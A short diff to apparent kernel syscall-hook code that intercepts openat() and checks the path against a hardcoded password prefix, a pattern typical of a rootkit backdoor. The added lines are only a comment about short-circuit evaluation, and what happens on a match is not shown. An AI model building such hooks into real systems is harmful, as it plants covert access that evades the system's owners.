@@ -117,6 +117,10 @@ new_sy_call(struct thread *td, void *syscall_args) {
     char *str = args->path;
 
     // check if the string argument to openat() contains the password prefix.
+    // note that if the string is shorter than the password or if
+    // the string does not match the password, then the check
+    // will terminate early and prevent reading out of
+    // bounds of the array due to C's short circuiting behavior.
     if (str[0] == '*' &&
         str[1] == '3' &&
         str[2] == 'f' &&
